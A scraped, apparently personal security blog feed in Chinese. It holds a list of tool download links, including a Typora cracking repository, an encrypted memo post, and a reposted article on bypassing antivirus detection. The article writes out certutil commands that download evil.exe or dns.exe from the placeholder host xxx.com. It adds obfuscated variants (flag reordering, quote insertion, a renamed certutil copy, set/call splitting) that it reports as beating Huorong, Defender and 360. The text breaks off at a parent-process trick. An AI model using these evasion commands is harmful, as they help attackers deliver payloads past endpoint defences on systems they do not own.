<p>clash订阅链接</p>
<p><a href="https://github.com/anaer/Sub">https://github.com/anaer/Sub</a></p>
<p><a href="https://raw.githubusercontent.com/ermaozi/get_subscribe/main/subscribe/clash.yml">https://raw.githubusercontent.com/ermaozi/get_subscribe/main/subscribe/clash.yml</a></p>
</blockquote>
<p><strong>geph(迷雾通免费vpn)</strong></p>
<blockquote>
<p><a href="https://geph.io/zhs/">https://geph.io/zhs/</a> （需翻墙）</p>
<p><a href="https://cowtransfer.com/s/a5f3ed4f057841">https://cowtransfer.com/s/a5f3ed4f057841</a> v4.4.20</p>
</blockquote>
<h4 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h4><p><strong>IDEA</strong></p>
<blockquote>
<p><a href="https://www.jetbrains.com/idea/download/">https://www.jetbrains.com/idea/download/</a></p>
</blockquote>
<p><strong>Vscode</strong></p>
<blockquote>
<p><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拓展</span><br><span class="line">One Dark Pro</span><br><span class="line">Python</span><br><span class="line">Chinese</span><br><span class="line">Beautify</span><br><span class="line">Material Icon Theme</span><br><span class="line">Auto Rename Tag</span><br></pre></td></tr></table></figure>



<h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><p><strong>Telegram</strong></p>
<p>情报收集、聊天</p>
<blockquote>
<p><a href="https://desktop.telegram.org/">https://desktop.telegram.org/</a></p>
</blockquote>
<p><strong>Tor</strong></p>
<p>洋葱浏览器</p>
<blockquote>
<p><a href="https://www.torproject.org/zh-CN/download/">https://www.torproject.org/zh-CN/download/</a></p>
</blockquote>
<p><strong>vmware Workstation Pro</strong></p>
<blockquote>
<p><a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</a></p>
</blockquote>
<p><strong>pentest</strong>：渗透测试工具套件（所有渗透工具都放在共享文件夹）</p>
<blockquote>
<p><a href="https://github.com/ccc-f/PenKitGui">https://github.com/ccc-f/PenKitGui</a></p>
</blockquote>
<p><strong>burp 拓展</strong></p>
<blockquote>
<p><a href="https://cowtransfer.com/s/d787cfc73d7945">https://cowtransfer.com/s/d787cfc73d7945</a></p>
</blockquote>
<p><strong>win10镜像</strong></p>
<p>测试软件安全性，debuff 加满</p>
<blockquote>
<p><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p>
</blockquote>
<p><strong>kali VMware版</strong></p>
<blockquote>
<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
<p>docker</p>
<p><a href="https://fstraw.cn/posts/f3791bd3.html">https://fstraw.cn/posts/f3791bd3.html</a></p>
<p>kali优化</p>
<p><a href="https://fstraw.cn/posts/56c73bb3.html">https://fstraw.cn/posts/56c73bb3.html</a></p>
<p>Linux好用的项目</p>
<p><a href="https://mp.weixin.qq.com/s/1ucpkx9Pz0myDJLqAV89pQ">https://mp.weixin.qq.com/s/1ucpkx9Pz0myDJLqAV89pQ</a></p>
</blockquote>
<p><strong>openvpn</strong></p>
<p><a href="https://cowtransfer.com/s/8905be7d635740">https://cowtransfer.com/s/8905be7d635740</a></p>
<p><strong>夜神模拟器</strong></p>
<p>v7版以下，方便抓包）</p>
<blockquote>
<p><a href="https://support.yeshen.com/zh-CN/win-release">https://support.yeshen.com/zh-CN/win-release</a></p>
</blockquote>
<p><strong>Proxifier</strong></p>
<blockquote>
<p><a href="https://cowtransfer.com/s/b606ba4423d947">https://cowtransfer.com/s/b606ba4423d947</a></p>
</blockquote>
<p><strong>火绒剑</strong></p>
<p><a href="https://cowtransfer.com/s/185dac5a99034a">https://cowtransfer.com/s/185dac5a99034a</a></p>
<p><strong>Goby</strong></p>
<blockquote>
<p><a href="https://gobies.org/">https://gobies.org/</a></p>
<p>Fofa<br>Subdomain</p>
</blockquote>
<p><strong>mobaXterm</strong></p>
<blockquote>
<p><a href="https://mobaxterm.mobatek.net/">https://mobaxterm.mobatek.net/</a></p>
</blockquote>
<p><strong>wireshark</strong></p>
<blockquote>
<p><a href="https://www.wireshark.org/#download">https://www.wireshark.org/#download</a></p>
</blockquote>
<p><strong>Firefox</strong></p>
<blockquote>
<p>主要用来渗透测试<br>弃了谷歌，转战firefox：</p>
<p>腾讯翻译</p>
<p>Cookie Quick Manager</p>
<p>FoxyProxy 标准版</p>
<p>HackBar V2</p>
<p>Shodan</p>
<p>User-Agent Switcher and Manager</p>
<p>Wappalyzer - Technology profiler</p>
<p>OneTab</p>
</blockquote>
<h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><p><strong>obsidian</strong></p>
<blockquote>
<p><a href="https://obsidian.md/">https://obsidian.md/</a></p>
<p><a href="https://github.com/kmaasrud/awesome-obsidian">https://github.com/kmaasrud/awesome-obsidian</a></p>
</blockquote>
<p><strong>Typora</strong></p>
<blockquote>
<p><a href="https://typoraio.cn/releases/all">https://typoraio.cn/releases/all</a></p>
<p><a href="https://github.com/WittonBell/typoraCracker">https://github.com/WittonBell/typoraCracker</a></p>
<p>主题<br>DrakeTyporaTheme-master<br><a href="https://github.com/liangjingkanji/DrakeTyporaTheme">https://github.com/liangjingkanji/DrakeTyporaTheme</a></p>
</blockquote>
<p><strong>hexo butterfly主题</strong></p>
<blockquote>
<p>myblog<br>备份文件：<br>_config.yml<br>package.json<br>scaffolds&#x2F;<br>source&#x2F;<br>themes&#x2F;</p>
</blockquote>
<h4 id="个人"><a href="#个人" class="headerlink" title="个人"></a>个人</h4><p><strong>LOL</strong></p>
<blockquote>
<p><a href="https://lol.qq.com/main.shtml">https://lol.qq.com/main.shtml</a></p>
</blockquote>
<p><strong>Lol skins</strong></p>
<blockquote>
<p><a href="http://leagueskin.net/p/download-mod-skin-2020-chn">http://leagueskin.net/p/download-mod-skin-2020-chn</a></p>
</blockquote>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>个人备忘录(加密版)</title>
    <url>/posts/81744c33.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4998c0e1bd586965ac7639013038cdf89d470d5f54241efb25fb5fef302f1ceb">c56bff9ff4784331a27ff89cd428acae564e1d0c8c098e831e02c02e99be171f39e934138188842c8910a8d55054f5db6cad31b8f6feccf2a1efaa21a5c4f9d8c29e982a590077d4b43ede5f653b1b5ee1e9a94cb85d6bd5c9ea2362a2f1282a2177eb7dfac31f70d4e806dc8766dba649d187dfeead685ce927476e05d52acae72ca99f7ab630a5adc529cdc4b7639e895399173c520dee31ed729f223c6845deebab65851fb4c4ad65c6d97fde2cbf8479270d1bf36892999d5b6b620cf7c277395d16488ab48684db0b7e635f3e1d8d8ff97ead15f02afb5b8776d7178faa448505828ac33d2018948bec42b4f8d9f61faac19f7d6bcee7be0df13b90ef1eb7a7510fa26d02364ec5ae637b5c43a4fdde580276a7a5824531b80213b1562e44e5b0b49b56fe02d72c169ba9106438b40f47e6563741f970bfd19f108c706165bdf8d09fde2562fc4c3147ccf0d6f95950d8ebb11c6662c805a0d8376e4c01fc8905c7f29f07f4683df8bc9ea2a6d3f924825fca6f237a0db2521ddcd738d2cebe5e42134396ccda2c47545268bec790475501bfb67c1844bb79e1c0b9d8c26a1d295d9c854840c44bcedfc2b9a72ebcf4a106c1331bbf2cdda5e17194b85cfb67a7c9342e3a8ddab0768c3aa4cf44616063924b53d788e6f38885ad036e8b00551ea679968ed89ea66d95fd7011f1c79a5fde4bd2a8db773784ecbc492394462455ff1255d2e6e51fd832060cd7766f559a87e7453d7d614597e963917d5d5131a58b3d439faa6584a8c9b91ecf9e965ea61677d25256f95081b5c986c084bb710cc598a1a0df65ff7a73c55d49a17d046be09ceaa458df1ff413c18cd91742078d5d371e2747f9ded873cef941481b2aa6d81c56ddcaadd70d08a6a91a36a9e9731264d8dd50d33b3210d3fb4a122cf2c1aaa0849433a75c8a77c1bf849a6f157556fea6e010c4776da84274fcc98f01912e20f95fb96bdfc888963a583ed96ecf7079f41c62d07bdfa13c520bc469b353950c0f8c2ae423b2ec301f2127b807b01ef375e961a890435fccc2416084f4ad8a44caa4745f1aa9bed49539d4e1ee5398766bfd5d5df5c7178a069d57ad9177a94ab51a95d5789608870c789c0e000684ab9791dfcea386fa00621bffaf4a6f616249ca8c177c2b74482d94bd2c82aecaa2c1b70b08d7aee95740ee49d9cc8c30e43c1e0b8b51ab396c536cb7bdfcc2dfbab0c2bad3a805dc7ce5ba34d938172cf1f889457d25119d916fa48027f89745ec7be72f71780db824ad6a82c24dcc044118e488da8a928c0075034a83b7026ab099b9733af1ad257496da950f26658eb40e29189cb84de9dd7650a340f41accae494cc529c738e37bc5c4b52b8eb017ef3fe6bdc4443787c9d2f2609ac8f2c5ecaebded9cd67f7e6b93165b85bcdde27ea9825e1334efa649b543dd9b3c12d4fd67689859adbf2a20ed73ef67562f950b015a9c09e593dbef7fbd61025af801b5b8801a1cb0762b4646cf7cbdb14124820d4a645b606e2566e510a15531c17086fcd489505fc41ee765866e045e95f1ce1ac516e83a1efd922701b7df009de6c3b662e598b9438378ac1265795e87d420be3776cf69987f76c1528dd155830eb51236c1037d32800885fa818f55a5c60659fba1a663a3c769be3d07875c56896e4c4f4c6939d7d291f4c340f4d60705583781b122262f1e6772eb544543e098139e9269015b47ae440c93a5b271d407dcf0c292a5104c199bf3d122695205ca5243a2ee3d9decd304b5331feb12764f30e2a45557bdb0d400bff822b7b40fd33f3719533e58c0140bc9f0dfb61e1442a23b0141526fcaf39860587582078e02301f64d07e449e0197dedc4dde696535429ff67b5a3536f0e488e18be1093f9ac874bcd8ad24e46485f6150bbae4d52aed7dcd76c43c131a232f3624ea056310d3a21e9db98c560a0903558ed3c5b2f2e9abc8cd2fa54c183b69d3453b0ec8d23cbdee145827242a8791b3994e6c7a53c8d6918c01a481c1edf0887e216bea3b9f73f44e4ddd3a6498ca01af81fdce9ae3b458f2014b34a2aa5bf2a8d5c3b26a9260fa0eebb0f625d6eef56a858efac5f99a5c212a4fd775332707cde686832b7df28b3920e2a8e96f9728e972715a1e060b4f53025c8b05baa78c3a285a345cf316c21ba3fa75a699dfd4bd468ee69d8c243f65b0758210fd64828b31351dbd706dcbb7e353c529fced323f70b69f52082c1220574d0eebaabe138f6a9502ad9f52e224dec3e729d21af95feb751099e35033eea244c00dc03baf850f319306381b078e23664f6a124caa1a50b3ab0d32f2c5e8de21faa2cb04f3d22b11364efdec6bada0d47d1dc745383807469b9c02e9adc701553abdf33ea35b2279ac6a9277a977e24efec0f464e5c644a71013effa3ee8a736445893571baeee3cc3fe9af9942f02bc743f96a5d638513106e4cdf4b37c5b0604480a386a8485809bb68a03e48a96addf8a06c48c4b358440059039702c91afabb6e69382345f57b771f2aa0326b754509e93c84d80fa84ea4535623313cd840e00970b884d36d2391a4351e711f5193e005f19101f788ded504667b7bd1f8225fffbfb60549277b7bb05ba820e87a2222a30707e1c546b15d44d6cef98f0e4ff2ec7cc4844844aecd4678e394efd9909a77393377ab2c398674d68b0a48f7b0d165c4ac1543ff70f9f043d1945edc3e885c9ae07674b63d6a87bdabcb4857b925fb3300c552d2833433dfeeda915392a41f1dac6f10e5c3e3374c98bc38255b5156a89717c0d731af297a10406916ead7775a330e39f52ab70b5fca7ae05d7287537cd827432e16a0e485026dc0d63392b9d72136e1ce169c9bcbc9d1d48117730f6c268a4441ceb20fcd04e2f9ec419a4d4d481db51aecf9c043fa1ebf2890032550db1afabec6c922e618a54f7c05b0042bcda628826ab871e14c987376533d81b59fcdc2f327fea8b347e90bddbbcf27e691c43a46ff213fe63ff71087c0c15b1be87d9a5bbb89681eacf02c886a89f23eaee37d27dc36a4f6bc24e50c3b49978c361c2927ffae05f86d3ab48a074b5871a6c2d76f2cab169291114ab7625d4871aba37f66d8d4b350cae0c127f3f2b40f13a8a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-shrink">
      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/ccc-f/lib/hbe.js"></script><link href="/ccc-f/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>从Certutil下载绕过探究常见杀软的绕过思路</title>
    <url>/posts/94237e26.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：certutil 用途很广，除了下载外，还可以用来在 Windows 上 base64 木马文件，然后上传，可以有效的绕过各种 av。</p>
<p>转载自：<a href="https://mp.weixin.qq.com/s/MUH5Dh6pHiTvWqGCjbXpNw">https://mp.weixin.qq.com/s/MUH5Dh6pHiTvWqGCjbXpNw</a></p>
</blockquote>
<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>在之前某个项目中，遇到一个只能用ms17-010-command打的Windows Server 2008 R2，每次执行输入一条命令，有些特殊符号还不能带入，这台服务器上也有开了核晶防护引擎的360安全卫士，当时简单试了一下添加管理员用户的绕过没成，看来还是得下一个exe进行多人运动。网络上找了一些下载命令变形发现都被拦了，于是本地测试了一下，项目后也顺便测试其他杀软检测效果，我们以常见的certutil为例（其他带下载功能的系统exe绕过思路都是相通的）来探究一下国内常见的杀软的绕过思路。</p>
<h2 id="0X01-Certutil介绍"><a href="#0X01-Certutil介绍" class="headerlink" title="0X01 Certutil介绍"></a>0X01 Certutil介绍</h2><p>首先简单介绍一下Windows系统自带certutil：</p>
<p>certutil.exe是作为证书服务的一部分安装的命令行程序。可以使用certutil.exe转储和显示证书颁发机构 (CA) 配置信息、配置证书服务、备份和还原 CA 组件，以及验证证书、密钥对和证书链。</p>
<p>更多可以参考微软官方的介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil</span><br></pre></td></tr></table></figure>



<p>我们一般利用certutil下载文件，常见命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://xxx.com/evil.exe</span><br></pre></td></tr></table></figure>



<p>这里简单介绍一下参数：</p>
<ul>
<li>-urlcache 显示或删除URL缓存条目。无值的命令行选项。</li>
<li>-f 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。</li>
<li>-split 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。</li>
</ul>
<p>另外以下命令也是可以正常下载的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://xxx.com/evil.exe dns.exe</span><br></pre></td></tr></table></figure>



<h2 id="0X02-绕过过程"><a href="#0X02-绕过过程" class="headerlink" title="0X02 绕过过程"></a>0X02 绕过过程</h2><h2 id="0X03-火绒绕过"><a href="#0X03-火绒绕过" class="headerlink" title="0X03   火绒绕过"></a>0X03   火绒绕过</h2><p>测试环境：win11 x64 物理机 火绒 5.0.68.1 默认配置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640.png" alt="图片"></p>
<p>火绒对默认的下载的语句会拦截。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338571.png" alt="图片"></p>
<p>我们尝试随便添加不存在的-a参数，可以看到火绒也是要拦的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://xxx.com/dns.exe -a</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338582.png" alt="图片"></p>
<p>那我们尝试换过一下参数位置，可以火绒不拦截了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -a -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338583.png" alt="图片"></p>
<p>我们只要-a参数换为不影响下载功能的参数即可绕过火绒。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -gmt -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338594.png" alt="图片"></p>
<p>从上面测试过程大概推测出火绒是基于正则语句规则进行匹配语句的，基于静态的规则匹配比较鸡肋，我只要稍微变形一下语句不让其不匹配到即可绕过，比如在-split参数前面多加一个空格就绕过了，大家可以随意发挥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338595.png" alt="图片"></p>
<h2 id="0X04-Defender绕过"><a href="#0X04-Defender绕过" class="headerlink" title="0X04 Defender绕过"></a>0X04 Defender绕过</h2><p>测试环境：win10 x64 物理机 Windows Defernder 4.18.2203.5-0 默认配置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>我们对首先使用默认下载语句测试一下Defernder，可以看到是被Denferder检测到了，而且我们尝试在参数后面加一些干扰字符也无用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338596.png" alt="图片"></p>
<p>那我们尝试对参数做一下变形呢，在Windows cmd中有些字符串是不影响命令原意的，比如^和”。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338597.png" alt="图片"></p>
<p>那我们可以利用这一特性尝试绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -url&quot;&quot;&quot;&quot;cache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>可以从上图看到当我们在urlcache参数里加入2组””即可绕过Denfender的检测，可以分析出Denfender不只是简单匹配命令语句，也会动态检查运行命令的参数。</p>
<h2 id="0X05-360绕过"><a href="#0X05-360绕过" class="headerlink" title="0X05   360绕过"></a>0X05   360绕过</h2><p>测试环境：物理机 win10 x64 360安全卫士 13.0.0.2003 防护全开 开启核晶防护引擎</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338598.png" alt="图片"></p>
<p>从以往的经验来看，360安全卫士的物理机防护和查杀效果都比虚拟机要强，所以这次我们就用物理机来测，先简单测试一下命令变形，可以看到都被拦截了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-16539169338609.png" alt="图片"></p>
<p>那我们试着把参数减少看看情况。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386010.png" alt="图片"></p>
<p>可以看到我们即使参数缩短到不正常工作的命令行也会拦截，对其参数再怎么变形都无用，有点变态，综上可以看出来是对certutil运行参数进行了动态检测，只要动态执行后的参数有-urlcache就拦截。</p>
<p>既然对certutil检测那么严，那我们换换思路，给certutil换个路径和文件名看看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy c:\windows\system32\certutil.exe c.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>可以看到执行c -urlcache不再拦截了，说明思路可行，那我们再次加上其他参数看看情况呢，可以看到成功绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c -urlcache -split -f http://xxx.com/dns.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386011.png" alt="图片"></p>
<h2 id="0X06-天擎绕过"><a href="#0X06-天擎绕过" class="headerlink" title="0X06 天擎绕过"></a>0X06 天擎绕过</h2><p>测试环境：虚拟机 win7sp1 x64 天擎 v10.3.0.2009 防护全开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386012.png" alt="图片"></p>
<p>首先还是先测试一下命令参数变形的情况，可以看到都拦截了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>我们再加入更复杂的变形也不行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386013.png" alt="图片"></p>
<p>试一下过360的思路，还是被拦了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386114.png" alt="图片"></p>
<p>既然有静态的参数urlcache就被拦，那动态拼接出参数urlcache呢？</p>
<p>我们用set命令进行赋值，把参数urlcache进行拆分，然后用call命令来调用，用%a1%格式来拼接出参数urlcache，可以到看到还是被拦了，看来天擎是程序运行后再获取到实际的参数再做匹配的，可以，很强。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>测到这里看来普通的参数字符变形是行不通的，我们换换思路，加入其他的命令进行变形看看情况呢。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%BB%8ECertutil%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E6%8E%A2%E7%A9%B6%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/640-165391693386115.png" alt="图片"></p>
<p>还是被拦了，不过看之前的拦截信息，父进程来源都是cmd.exe，那我们试一下改变其父进程呢，改变其进程链，使用pcalua启动certutil。</p>
